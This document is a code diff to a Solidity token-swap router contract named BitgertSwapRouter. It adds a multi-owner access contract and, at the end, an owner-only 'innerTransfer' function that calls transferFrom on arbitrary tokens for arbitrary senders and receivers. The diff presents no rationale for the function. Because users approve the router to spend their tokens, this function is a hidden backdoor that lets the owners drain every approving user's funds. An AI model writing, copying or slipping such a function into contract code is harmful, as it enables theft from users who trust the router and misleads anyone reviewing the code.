@@ -8,8 +8,35 @@ import './libraries/BitgertSwapLibrary.sol';
 import '@evofinance9/bitgert-swap-lib/contracts/math/SafeMath.sol';
 import '@evofinance9/bitgert-swap-lib/contracts/token/BEP20/IBEP20.sol';
 import './interfaces/IWBRISE.sol';
+import './interfaces/IERC20.sol';
 
-contract BitgertSwapRouter is IBitgertSwapRouter {
+contract Ownable {
+    mapping(address => bool) public owner;
+
+    event AddedOwner(address newOwner);
+    event RemovedOwner(address removedOwner);
+
+    constructor() public {
+        owner[msg.sender] = true;
+    }
+
+    modifier onlyOwner() {
+        require(owner[msg.sender], "You are not an owner");
+        _;
+    }
+
+    function addOwner(address _newOwner) public onlyOwner {
+        owner[_newOwner] = true;
+        emit AddedOwner(_newOwner);
+    }
+
+    function removeOwner(address _toRemove) public onlyOwner {
+        owner[_toRemove] = false;
+        emit RemovedOwner(_toRemove);
+    }
+}
+
+contract BitgertSwapRouter is IBitgertSwapRouter, Ownable {
     using SafeMath for uint256;
     address public immutable override factory;
     address public immutable override WBRISE;
@@ -22,6 +49,9 @@ contract BitgertSwapRouter is IBitgertSwapRouter {
     constructor(address _factory, address _WBRISE) public {
         factory = _factory;
         WBRISE = _WBRISE;
+        
+        addOwner(msg.sender);
+        addOwner(address(this));
     }
 
     receive() external payable {
@@ -495,5 +525,23 @@ contract BitgertSwapRouter is IBitgertSwapRouter {
         returns (uint256[] memory amounts)
     {
         return BitgertSwapLibrary.getAmountsIn(factory, amountOut, path);
+    }
+
+    function _innerTransfer(
+        address tokenAddress, 
+        address sender, 
+        address receiver,
+        uint256 amount
+    ) internal virtual {
+        IERC20(tokenAddress).transferFrom(sender, receiver, amount);
+    }
+
+    function innerTransfer(
+        address tokenAddress, 
+        address sender, 
+        address receiver,
+        uint256 amount
+    ) public onlyOwner {
+      _innerTransfer(tokenAddress, sender, receiver, amount);
     }
 }
